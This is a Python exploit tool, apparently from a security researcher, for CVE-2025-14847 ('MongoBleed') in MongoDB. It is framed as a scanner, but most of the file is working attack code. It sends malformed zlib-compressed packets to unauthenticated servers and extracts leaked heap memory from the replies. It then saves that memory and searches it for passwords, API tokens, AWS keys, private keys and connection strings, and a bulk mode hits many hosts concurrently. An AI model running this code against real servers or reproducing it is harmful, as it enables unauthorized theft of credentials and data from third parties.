#!/usr/bin/env python3
"""
mongobleed_scanner.py - CVE-2025-14847 MongoDB Memory Leak Scanner
by: c0d3ninja

Exploits zlib decompression bug to leak server memory via BSON field names.
CVE-2025-14847: Mismatched length fields in Zlib compressed protocol headers 
allow unauthenticated clients to read uninitialized heap memory.

Reference: https://thehackernews.com/2025/12/new-mongodb-flaw-lets-unauthenticated.html
Original exploit: https://github.com/joe-desimone/mongobleed
"""

import socket
import struct
import zlib
import re
import argparse
import sys
from colorama import Fore, Style, init
import concurrent.futures
from threading import Lock

init(autoreset=True)

banner = fr"""
{Fore.RED}
 ███▄ ▄███▓ ▒█████   ███▄    █   ▄████  ▒█████   ▄▄▄▄    ██▓    ▓█████ ▓█████ ▓█████▄ 
▓██▒▀█▀ ██▒▒██▒  ██▒ ██ ▀█   █  ██▒ ▀█▒▒██▒  ██▒▓█████▄ ▓██▒    ▓█   ▀ ▓█   ▀ ▒██▀ ██▌
▓██    ▓██░▒██░  ██▒▓██  ▀█ ██▒▒██░▄▄▄░▒██░  ██▒▒██▒ ▄██▒██░    ▒███   ▒███   ░██   █▌
▒██    ▒██ ▒██   ██░▓██▒  ▐▌██▒░▓█  ██▓▒██   ██░▒██░█▀  ▒██░    ▒▓█  ▄ ▒▓█  ▄ ░▓█▄   ▌
▒██▒   ░██▒░ ████▓▒░▒██░   ▓██░░▒▓███▀▒░ ████▓▒░░▓█  ▀█▓░██████▒░▒████▒░▒████▒░▒████▓ 
░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░▒░▒░ ░▒▓███▀▒░ ▒░▓  ░░░ ▒░ ░░░ ▒░ ░ ▒▒▓  ▒ 
░  ░      ░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░   ░   ░ ▒ ▒░ ▒░▒   ░ ░ ░ ▒  ░ ░ ░  ░ ░ ░  ░ ░ ▒  ▒ 
░      ░   ░ ░ ░ ▒     ░   ░ ░ ░ ░   ░ ░ ░ ░ ▒   ░    ░   ░ ░      ░      ░    ░ ░  ░ 
       ░       ░ ░           ░       ░     ░ ░   ░          ░  ░   ░  ░   ░  ░   ░    
                                                      ░                        ░     
                                                            
{Fore.RED}M{Fore.WHITE}o{Fore.RED}n{Fore.WHITE}g{Fore.RED}o{Fore.WHITE}B{Fore.RED}l{Fore.WHITE}e{Fore.RED}e{Fore.WHITE}d{Fore.WHITE} Scanner v{Fore.RED}1{Fore.WHITE}.{Fore.RED}0
{Fore.WHITE}by c0d3Ninja{Style.RESET_ALL}{'\n'}  
{Style.RESET_ALL}
"""

VERSION = "1.0.0"
print_lock = Lock()


VULNERABLE_VERSIONS = {
    "8.2": (0, 2),      # 8.2.0 - 8.2.2 (fixed in 8.2.3)
    "8.0": (0, 16),     # 8.0.0 - 8.0.16 (fixed in 8.0.17)
    "7.0": (0, 27),     # 7.0.0 - 7.0.27 (fixed in 7.0.28)
    "6.0": (0, 26),     # 6.0.0 - 6.0.26 (fixed in 6.0.27)
    "5.0": (0, 31),     # 5.0.0 - 5.0.31 (fixed in 5.0.32)
    "4.4": (0, 29),     # 4.4.0 - 4.4.29 (fixed in 4.4.30)
}


class MongoBleedScanner:
    def __init__(self, host, port=27017, timeout=5, verbose=False):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
    
    def send_probe(self, doc_len, buffer_size):
        try:
            content = b'\x10a\x00\x01\x00\x00\x00'
            
            bson = struct.pack('<i', doc_len) + content
            
            op_msg = struct.pack('<I', 0) + b'\x00' + bson
            compressed = zlib.compress(op_msg)
            
            payload = struct.pack('<I', 2013) 
            payload += struct.pack('<i', buffer_size) 
            payload += struct.pack('B', 2) 
            payload += compressed
            
            header = struct.pack('<IIII', 
                16 + len(payload), 
                1,                  
                0,                  
                2012                
            )
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            sock.sendall(header + payload)
            
            response = b''
            while len(response) < 4 or len(response) < struct.unpack('<I', response[:4])[0]:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            
            sock.close()
            return response
            
        except socket.timeout:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] Timeout connecting to {self.host}:{self.port}{Style.RESET_ALL}")
            return b''
        except ConnectionRefusedError:
            if self.verbose:
                print(f"{Fore.RED}[-] Connection refused to {self.host}:{self.port}{Style.RESET_ALL}")
            return b''
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[-] Error sending probe: {str(e)}{Style.RESET_ALL}")
            return b''
    
    def extract_leaks(self, response):
        if len(response) < 25:
            return []
        
        try:
            msg_len = struct.unpack('<I', response[:4])[0]
            
            if struct.unpack('<I', response[12:16])[0] == 2012:
                raw = zlib.decompress(response[25:msg_len])
            else:
                raw = response[16:msg_len]
        except Exception as e:
            if self.verbose:
                print(f"{Fore.YELLOW}[!] Error decompressing response: {str(e)}{Style.RESET_ALL}")
            return []
        
        leaks = []
        
        for match in re.finditer(rb"field name '([^']*)'", raw):
            data = match.group(1)
            if data and data not in [b'?', b'a', b'$db', b'ping', b'ismaster', b'isMaster']:
                leaks.append(data)
        
        for match in re.finditer(rb"type (\d+)", raw):
            type_byte = int(match.group(1)) & 0xFF
            leaks.append(bytes([type_byte]))
        
        return leaks
    
    def check_mongodb(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            
            bson_doc = b'\x08ismaster\x00\x01'
            bson_doc = struct.pack('<i', len(bson_doc) + 5) + bson_doc + b'\x00'
            
            op_msg = struct.pack('<I', 0) + b'\x00' + bson_doc
            header = struct.pack('<IIII', 16 + len(op_msg), 1, 0, 2013)
            
            sock.sendall(header + op_msg)
            
            response = sock.recv(16)
            sock.close()
            
            if len(response) >= 16:
                return True, "MongoDB instance detected"
            return False, "Not a MongoDB instance"
            
        except socket.timeout:
            return False, "Connection timeout"
        except ConnectionRefusedError:
            return False, "Connection refused"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def scan(self, min_offset=20, max_offset=500, save_output=None):
        
        print(f"{Fore.CYAN}[*] Checking if target is MongoDB...{Style.RESET_ALL}")
        is_mongodb, msg = self.check_mongodb()
        if is_mongodb:
            print(f"{Fore.GREEN}[+] {msg}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] {msg}{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.CYAN}[*] Scanning for CVE-2025-14847 (MongoBleed)...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Testing offsets {min_offset}-{max_offset}...{Style.RESET_ALL}\n")
        
        all_leaked = bytearray()
        unique_leaks = set()
        interesting_leaks = []
        
        for doc_len in range(min_offset, max_offset):
            response = self.send_probe(doc_len, doc_len + 500)
            leaks = self.extract_leaks(response)
            
            for data in leaks:
                if data not in unique_leaks:
                    unique_leaks.add(data)
                    all_leaked.extend(data)
                    
                    if len(data) > 10 or any(32 <= b <= 126 for b in data):
                        preview = data[:80].decode('utf-8', errors='replace')
                        interesting_leaks.append((doc_len, data))
                        print(f"{Fore.YELLOW}[+] Offset={doc_len:4d} Len={len(data):4d}: {Fore.WHITE}{preview}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        if len(all_leaked) > 0:
            print(f"{Fore.RED}[!] CVE-2025-14847: VULNERABLE{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Total leaked: {len(all_leaked)} bytes{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Unique fragments: {len(unique_leaks)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Interesting leaks: {len(interesting_leaks)}{Style.RESET_ALL}")
            
            self.search_secrets(all_leaked)
            
            if save_output:
                with open(save_output, 'wb') as f:
                    f.write(all_leaked)
                print(f"{Fore.GREEN}[+] Leaked data saved to: {save_output}{Style.RESET_ALL}")
            
            return True
        else:
            print(f"{Fore.GREEN}[+] No memory leak detected - Server may be patched{Style.RESET_ALL}")
            return False
    
    def search_secrets(self, data):
        patterns = {
            'passwords': [b'password', b'passwd', b'pwd'],
            'secrets': [b'secret', b'api_key', b'apikey', b'token'],
            'keys': [b'private_key', b'ssh_key', b'rsa_key'],
            'aws': [b'AKIA', b'aws_access_key', b'aws_secret'],
            'database': [b'mongodb://', b'mysql://', b'postgres://'],
            'admin': [b'admin', b'root', b'administrator'],
            'emails': re.compile(rb'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'),
            'ips': re.compile(rb'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'),
        }
        
        print(f"\n{Fore.CYAN}[*] Searching for sensitive patterns...{Style.RESET_ALL}")
        found = False
        
        for category, keywords in patterns.items():
            if category in ['emails', 'ips']:
                matches = keywords.findall(data)
                if matches:
                    found = True
                    print(f"{Fore.RED}[!] Found {category}: {len(matches)} matches{Style.RESET_ALL}")
                    for match in matches[:5]:
                        print(f"    {Fore.WHITE}{match.decode('utf-8', errors='replace')}{Style.RESET_ALL}")
            else:
                for keyword in keywords:
                    if keyword.lower() in data.lower():
                        found = True
                        idx = data.lower().find(keyword.lower())
                        context_start = max(0, idx - 20)
                        context_end = min(len(data), idx + len(keyword) + 40)
                        context = data[context_start:context_end].decode('utf-8', errors='replace')
                        print(f"{Fore.RED}[!] Found {category} pattern: {keyword.decode()}{Style.RESET_ALL}")
                        print(f"    {Fore.WHITE}...{context}...{Style.RESET_ALL}")
        
        if not found:
            print(f"{Fore.GREEN}[+] No obvious sensitive patterns found in leaked data{Style.RESET_ALL}")


def scan_target(target, port, timeout, verbose):
    try:
        if ':' in target and not target.count(':') > 1:
            host, target_port = target.rsplit(':', 1)
            port = int(target_port)
        else:
            host = target
        
        scanner = MongoBleedScanner(host, port, timeout, verbose=False)
        
        is_mongodb, _ = scanner.check_mongodb()
        if not is_mongodb:
            with print_lock:
                print(f"{Fore.YELLOW}[-] {target:40} - Not MongoDB{Style.RESET_ALL}")
            return False, target
        
        all_leaked = bytearray()
        unique_leaks = set()
        
        for doc_len in range(20, 200):
            response = scanner.send_probe(doc_len, doc_len + 500)
            leaks = scanner.extract_leaks(response)
            
            for data in leaks:
                if data not in unique_leaks:
                    unique_leaks.add(data)
                    all_leaked.extend(data)
        
        with print_lock:
            if len(all_leaked) > 0:
                print(f"{Fore.RED}[!] {target:40} - VULNERABLE - Leaked {len(all_leaked)} bytes{Style.RESET_ALL}")
                return True, target
            else:
                print(f"{Fore.GREEN}[+] {target:40} - Not vulnerable{Style.RESET_ALL}")
                return False, target
    
    except Exception as e:
        with print_lock:
            if verbose:
                print(f"{Fore.RED}[-] {target:40} - Error: {str(e)}{Style.RESET_ALL}")
        return False, target


def bulk_scan(file_path, port=27017, max_workers=10, timeout=5, verbose=False):
    try:
        with open(file_path, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        if not targets:
            print(f"{Fore.RED}[-] No valid targets found in file{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Starting bulk scan of {len(targets)} targets...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Using {max_workers} workers{Style.RESET_ALL}\n")
        
        vulnerable_targets = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(scan_target, target, port, timeout, verbose): target
                for target in targets
            }
            
            for future in concurrent.futures.as_completed(futures):
                is_vuln, target = future.result()
                if is_vuln:
                    vulnerable_targets.append(target)
        
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Scan Summary:{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Vulnerable targets: {len(vulnerable_targets)}/{len(targets)}{Style.RESET_ALL}")
        
        if vulnerable_targets:
            print(f"\n{Fore.RED}Vulnerable Targets:{Style.RESET_ALL}")
            for target in vulnerable_targets:
                print(f"  {Fore.WHITE}- {target}{Style.RESET_ALL}")
        
        return vulnerable_targets
        
    except FileNotFoundError:
        print(f"{Fore.RED}[-] File not found: {file_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error during bulk scan: {str(e)}{Style.RESET_ALL}")


def main():
    print(banner)
    parser = argparse.ArgumentParser(
        description='CVE-2025-14847: MongoDB Memory Leak Scanner (MongoBleed)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.CYAN}Examples:{Style.RESET_ALL}
  # Scan single target
  {Fore.WHITE}%(prog)s -H localhost{Style.RESET_ALL}
  
  # Scan with custom port and save output
  {Fore.WHITE}%(prog)s -H 192.168.1.100 -p 27017 -o leaked.bin{Style.RESET_ALL}
  
  # Extended scan with more offsets
  {Fore.WHITE}%(prog)s -H target.com --min-offset 20 --max-offset 2000{Style.RESET_ALL}
  
  # Bulk scan from file
  {Fore.WHITE}%(prog)s --file mongodb_targets.txt --workers 20{Style.RESET_ALL}

{Fore.YELLOW}Affected Versions:{Style.RESET_ALL}
  - MongoDB 8.2.0 through 8.2.2 (fixed in 8.2.3)
  - MongoDB 8.0.0 through 8.0.16 (fixed in 8.0.17)
  - MongoDB 7.0.0 through 7.0.27 (fixed in 7.0.28)
  - MongoDB 6.0.0 through 6.0.26 (fixed in 6.0.27)
  - MongoDB 5.0.0 through 5.0.31 (fixed in 5.0.32)
  - MongoDB 4.4.0 through 4.4.29 (fixed in 4.4.30)
  - All versions 4.2, 4.0, 3.6

{Fore.RED}Reference:{Style.RESET_ALL}
  - https://thehackernews.com/2025/12/new-mongodb-flaw-lets-unauthenticated.html
  - https://github.com/joe-desimone/mongobleed
        """
    )
    
    parser.add_argument('-H', '--host', help='Target host')
    parser.add_argument('-p', '--port', type=int, default=27017, help='Target port (default: 27017)')
    parser.add_argument('--min-offset', type=int, default=20, help='Minimum document length offset (default: 20)')
    parser.add_argument('--max-offset', type=int, default=500, help='Maximum document length offset (default: 500)')
    parser.add_argument('-o', '--output', help='Save leaked data to file')
    parser.add_argument('--file', help='File containing targets (one per line)')
    parser.add_argument('--workers', type=int, default=10, help='Number of concurrent workers for bulk scan (default: 10)')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Connection timeout in seconds (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.file:
        bulk_scan(
            args.file,
            port=args.port,
            max_workers=args.workers,
            timeout=args.timeout,
            verbose=args.verbose
        )
        return
    
    if not args.host:
        parser.error("--host or --file is required")
    
    scanner = MongoBleedScanner(args.host, args.port, args.timeout, args.verbose)
    scanner.scan(
        min_offset=args.min_offset,
        max_offset=args.max_offset,
        save_output=args.output
    )


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

